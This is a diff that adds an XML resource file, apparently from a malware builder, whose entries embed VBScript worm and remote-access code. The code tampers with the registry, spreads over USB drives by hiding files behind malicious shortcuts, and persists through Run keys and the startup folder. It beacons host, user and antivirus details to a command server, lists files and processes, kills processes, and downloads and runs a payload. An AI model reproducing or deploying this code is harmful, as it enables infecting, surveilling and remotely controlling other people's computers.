+dim Key_INT32 
+select case reg_key
+	case "HKEY_CLASSES_ROOT"
+	Key_INT32 = HKEY_CLASSES_ROOT
+	case "HKEY_CURRENT_USER"
+	Key_INT32 = HKEY_CURRENT_USER
+	case "HKEY_LOCAL_MACHINE"
+	Key_INT32 = HKEY_LOCAL_MACHINE
+	case "HKEY_USERS"
+	Key_INT32 = HKEY_USERS
+	case "HKEY_CURRENT_CONFIG"
+	Key_INT32 = HKEY_CURRENT_CONFIG
+end select
+strComputer = "."
+Set objReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" _ 
+    &amp; strComputer &amp; "\root\default:StdRegProv")
+strKeyPath = key_path_entry
+objReg.DeleteKey  Key_INT32,strKeyPath
+end function 
+
+function GET_KEys(reg_key,key_path_entry)
+ on error resume next
+dim strComputer
+dim All_KS
+dim ALL_VLS
+Const HKEY_CLASSES_ROOT = &amp;H80000000
+Const HKEY_CURRENT_USER = &amp;H80000001
+Const HKEY_LOCAL_MACHINE = &amp;H80000002
+Const HKEY_USERS = &amp;H80000003
+Const HKEY_CURRENT_CONFIG = &amp;H80000005
+
+dim Key_INT32 
+select case reg_key
+	case "HKEY_CLASSES_ROOT"
+	Key_INT32 = HKEY_CLASSES_ROOT
+	case "HKEY_CURRENT_USER"
+	Key_INT32 = HKEY_CURRENT_USER
+	case "HKEY_LOCAL_MACHINE"
+	Key_INT32 = HKEY_LOCAL_MACHINE
+	case "HKEY_USERS"
+	Key_INT32 = HKEY_USERS
+	case "HKEY_CURRENT_CONFIG"
+	Key_INT32 = HKEY_CURRENT_CONFIG
+end select
+strComputer = "."
+
+Set objReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" _ 
+    &amp; strComputer &amp; "\root\default:StdRegProv")
+
+strKeyPath = key_path_entry
+
+objReg.EnumKey Key_INT32, strKeyPath, arrSubKeys
+
+For Each subkey In arrSubKeys
+	All_KS = All_KS &amp; subkey &amp; "|l_ln|"
+	objReg.EnumValues Key_INT32, strKeyPath , sNames , Types
+	Dim i 
+	i = 0
+	For each xx in sNames
+		dim full_ke_path 
+		full_ke_path = reg_key &amp; "\" &amp;  key_path_entry  &amp; "\" &amp; xx
+		dim Val_read
+		Val_read = Read_Reg_V(full_ke_path)
+		If Val_read &lt;&gt; "" Then 
+		'String is Not Null And Not Empty, code goes here
+		Else
+		
+		End If
+		ALL_VLS = ALL_VLS &amp; xx  &amp;   "#$"   &amp;  Types(i) &amp;   "#$"   &amp; Val_read &amp; "|vsl_n|"
+			  
+	i = i + 1
+	Next 
+		 
+Next
+GET_KEys = All_KS  &amp; "R#_$PL"  &amp; ALL_VLS &amp; "R#_$PL" 
+end function
+
+sub install
+'put here worm install code in regedit / dirs
+'then call "upstart" method
+exit sub 
+on error resume next
+dim lnkobj
+dim filename
+dim foldername
+dim fileicon
+dim foldericon
+upstart
+for each drive in filesystemobj.drives
+if  drive.isready = true then
+if  drive.freespace  &gt; 0 then
+if  drive.drivetype  = 1 then
+    filesystemobj.copyfile wscript.scriptfullname , drive.path &amp; "\" &amp; installname,true
+    if  filesystemobj.fileexists (drive.path &amp; "\" &amp; installname)  then
+        filesystemobj.getfile(drive.path &amp; "\"  &amp; installname).attributes = 2+4
+    end if
+    for each file in filesystemobj.getfolder( drive.path &amp; "\" ).Files
+        if not lnkfile then exit for
+        if  instr (file.name,".") then
+            if  lcase (split(file.name, ".") (ubound(split(file.name, ".")))) &lt;&gt; "lnk" then
+                file.attributes = 2+4
+                if  ucase (file.name) &lt;&gt; ucase (installname) then
+                    filename = split(file.name,".")
+                    set lnkobj = shellobj.createshortcut (drive.path &amp; "\"  &amp; filename (0) &amp; ".lnk") 
+                    lnkobj.windowstyle = 7
+                    lnkobj.targetpath = "cmd.exe"
+                    lnkobj.workingdirectory = ""
+                    lnkobj.arguments = "/c start " &amp; replace(installname," ", chrw(34) &amp; " " &amp; chrw(34)) &amp; "&amp;start " &amp; replace(file.name," ", chrw(34) &amp; " " &amp; chrw(34)) &amp;"&amp;exit"
+                    fileicon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\" &amp; shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\." &amp; split(file.name, ".")(ubound(split(file.name, ".")))&amp; "\") &amp; "\defaulticon\") 
+                    if  instr (fileicon,",") = 0 then
+                        lnkobj.iconlocation = file.path
+                    else 
+                        lnkobj.iconlocation = fileicon
+                    end if
+                    lnkobj.save()
+                end if
+            end if
+        end if
+    next
+    for each folder in filesystemobj.getfolder( drive.path &amp; "\" ).subfolders
+        if not lnkfolder then exit for
+        folder.attributes = 2+4
+        foldername = folder.name
+        set lnkobj = shellobj.createshortcut (drive.path &amp; "\"  &amp; foldername &amp; ".lnk") 
+        lnkobj.windowstyle = 7
+        lnkobj.targetpath = "cmd.exe"
+        lnkobj.workingdirectory = ""
+        lnkobj.arguments = "/c start " &amp; replace(installname," ", chrw(34) &amp; " " &amp; chrw(34)) &amp; "&amp;start explorer " &amp; replace(folder.name," ", chrw(34) &amp; " " &amp; chrw(34)) &amp;"&amp;exit"
+        foldericon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\folder\defaulticon\") 
+        if  instr (foldericon,",") = 0 then
+            lnkobj.iconlocation = folder.path
+        else 
+            lnkobj.iconlocation = foldericon
+        end if
+        lnkobj.save()
+    next
+end If
+end If
+end if
+next
+err.clear
+end sub
+sub uninstall
+wscript.quit
+on error resume next
+dim filename
+dim foldername
+shellobj.regdelete "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" &amp; split (installname,".")(0)
+shellobj.regdelete "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" &amp; split (installname,".")(0)
+filesystemobj.deletefile startup &amp; installname ,true
+filesystemobj.deletefile wscript.scriptfullname ,true
+for  each drive in filesystemobj.drives
+if  drive.isready = true then
+if  drive.freespace  &gt; 0 then
+if  drive.drivetype  = 1 then
+    for  each file in filesystemobj.getfolder ( drive.path &amp; "\").files
+         on error resume next
+         if  instr (file.name,".") then
+             if  lcase (split(file.name, ".")(ubound(split(file.name, ".")))) &lt;&gt; "lnk" then
+                 file.attributes = 0
+                 if  ucase (file.name) &lt;&gt; ucase (installname) then
+                     filename = split(file.name,".")
+                     filesystemobj.deletefile (drive.path &amp; "\" &amp; filename(0) &amp; ".lnk" )
+                 else
+                     filesystemobj.deletefile (drive.path &amp; "\" &amp; file.name)
+                 end If
+             else
+                 filesystemobj.deletefile (file.path) 
+             end if
+         end if
+     next
+     for each folder in filesystemobj.getfolder( drive.path &amp; "\" ).subfolders
+         folder.attributes = 0
+     next
+end if
+end if
+end if
+next
+wscript.quit
+end sub
+function post (cmd ,param)
+post = param
+httpobj.open "POST","http://" &amp; host &amp; ":" &amp; port &amp;"/" &amp; cmd, false
+httpobj.setrequestheader "User-Agent:",information
+httpobj.send param
+post = httpobj.responsetext
+end function
+function information
+on error resume next
+if  inf = "" then
+    inf = hwid &amp; spliter 
+    inf = inf  &amp; shellobj.expandenvironmentstrings("%computername%") &amp; spliter 
+    inf = inf  &amp; shellobj.expandenvironmentstrings("%username%") &amp; spliter
+    set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
+    set os = root.execquery ("select * from win32_operatingsystem")
+    for each osinfo in os
+       inf = inf &amp; osinfo.caption &amp; spliter  
+       exit for
+    next
+    inf = inf &amp; spliter &amp; "0.1" &amp; spliter &amp; security &amp; spliter &amp; usbspreading &amp; spliter
+    information = inf  
+else
+    information = inf
+end if
+end function
+sub upstart ()
+on error resume Next
+shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" &amp; split (installname,".")(0),  "wscript.exe //B " &amp; chrw(34) &amp; installdir &amp; installname &amp; chrw(34) , "REG_SZ"
+shellobj.regwrite "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" &amp; split (installname,".")(0),  "wscript.exe //B "  &amp; chrw(34) &amp; installdir &amp; installname &amp; chrw(34) , "REG_SZ"
+filesystemobj.copyfile wscript.scriptfullname,installdir &amp; installname,true
+filesystemobj.copyfile wscript.scriptfullname,startup &amp; installname ,true
+end sub
+function hwid
+on error resume next
+set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
+set disks = root.execquery ("select * from win32_logicaldisk")
+for each disk in disks
+    if  disk.volumeserialnumber &lt;&gt; "" then
+        hwid = disk.volumeserialnumber
+        exit for
+    end if
+next
+end function
+function security 
+on error resume next
+security = ""
+set objwmiservice = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
+set colitems = objwmiservice.execquery("select * from win32_operatingsystem",,48)
+for each objitem in colitems
+    versionstr = split (objitem.version,".")
+next
+versionstr = split (colitems.version,".")
+osversion = versionstr (0) &amp; "."
+for  x = 1 to ubound (versionstr)
+	 osversion = osversion &amp;  versionstr (i)
+next
+osversion = eval (osversion)
+if  osversion &gt; 6 then sc = "securitycenter2" else sc = "securitycenter"
+set objsecuritycenter = getobject("winmgmts:\\localhost\root\" &amp; sc)
+Set colantivirus = objsecuritycenter.execquery("select * from antivirusproduct","wql",0)
+for each objantivirus in colantivirus
+    security  = security  &amp; objantivirus.displayname &amp; " ."
+next
+if security  = "" then security  = "NAN/AV"
+end function
+function instance
+on error resume next
+usbspreading = shellobj.regread ("HKEY_LOCAL_MACHINE\software\" &amp; split (installname,".")(0) &amp; "\")
+if usbspreading = "" then
+   if lcase ( mid(wscript.scriptfullname,2)) = ":\" &amp;  lcase(installname) then
+      usbspreading = "YES - " &amp; date
+      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" &amp; split (installname,".")(0)  &amp; "\",  usbspreading, "REG_SZ"
+   else
+      usbspreading = "NO - " &amp; date
+      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" &amp; split (installname,".")(0)  &amp; "\",  usbspreading, "REG_SZ"
+   end if
+end If
+upstart
+set scriptfullnameshort =  filesystemobj.getfile (wscript.scriptfullname)
+set installfullnameshort =  filesystemobj.getfile (installdir &amp; installname)
+if  lcase (scriptfullnameshort.shortpath) &lt;&gt; lcase (installfullnameshort.shortpath) then 
+    shellobj.run "wscript.exe //B " &amp; chr(34) &amp; installdir &amp; installname &amp; Chr(34)
+    wscript.quit 
+end If
+err.clear
+set oneonce = filesystemobj.opentextfile (installdir &amp; installname ,8, false)
+if  err.number &gt; 0 then wscript.quit
+end function
+ Function enumdriver()
+
+        For Each drive In filesystemobj.drives
+            enumdriver = enumdriver &amp; drive.path &amp; "|" &amp; drive.drivetype &amp; "drv_split"
+           Next
+    End Function
+	
+    Function enumfaf(enumdir)
+	dim AllFolders
+	dim AllFiles
+        'enumfaf = enumdir &amp; "gfm_split"
+        For Each folder In filesystemobj.getfolder(enumdir).subfolders
+            AllFolders = AllFolders &amp; folder.name &amp; "#!#" &amp; "N/A" &amp; "#!#" &amp; "dir" &amp;  "gfm_split"
+        Next
+
+        For Each file In filesystemobj.getfolder(enumdir).files
+            AllFiles = AllFiles &amp; file.name &amp; "#!#" &amp; file.size &amp; "#!#" &amp; "fil" &amp;  "gfm_split"
+
+        Next
+		enumfaf = AllFolders  &amp; AllFiles  
+    End Function
+ Function enumprocess()
+on error resume next
+	 
+Dim objWMIService, objProcess, colProcess
+Dim strComputer, strList
+
+strComputer = "."
+
+Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" &amp; strComputer &amp; "\root\cimv2")
+
+Set colProcess = objWMIService.ExecQuery ("Select * from Win32_Process")
+
+For Each objProcess in colProcess
+
+    strList = strList &amp;  objProcess.Name &amp; "#" &amp; objProcess.processid  &amp; "#"  &amp; objProcess.executablepath  &amp; "PrO_SPL"
+
+Next
+enumprocess = strList
+    End Function
+    Sub exitprocess(pname)
+        On Error Resume Next
+		shellobj.run("TASKKILL /F /IM " &amp; pname)
+End Sub</value>
+  </data>
+  <data name="Dl_HELLOVIR" xml:space="preserve">
+    <value />
+  </data>
+  <data name="love_letter" xml:space="preserve">
+    <value />
+  </data>
+  <data name="ValiumVirus" xml:space="preserve">
+    <value />
+  </data>
+  <data name="DW" xml:space="preserve">
+    <value>On Error Resume Next
+Dim sh 
+Randomize
+Set sh = WScript.CreateObject("WScript.Shell")
+HTTPDownload "#1", sh.ExpandEnvironmentStrings("%temp%" &amp; "\#2.#3")
+Sub HTTPDownload( myURL, myPath )
+    Dim i, objFile, objFSO, objHTTP, strFile, strMsg
+    Const ForReading = 1, ForWriting = 2, ForAppending = 8
+    Set objFSO = CreateObject( "Scripting.FileSystemObject" )
+    If objFSO.FolderExists( myPath ) Then
+        strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) )
+    ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\" ) - 1 ) ) Then
+        strFile = myPath
+    Else
+        WScript.Echo "ERROR: Target folder not found."
+        Exit Sub
+    End If
+    Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )
+    Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
+    objHTTP.Open "GET", myURL, False
+    objHTTP.Send
+    For i = 1 To LenB( objHTTP.ResponseBody )
+        objFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )
+    Next
+    objFile.Close( )
+End Sub
+Set wshShell = WScript.CreateObject ("WSCript.shell")
+wshshell.run  sh.ExpandEnvironmentStrings("%temp%" &amp; "\#2.#3"), 6, True
+set wshshell = nothing</value>
+  </data>
+</root>
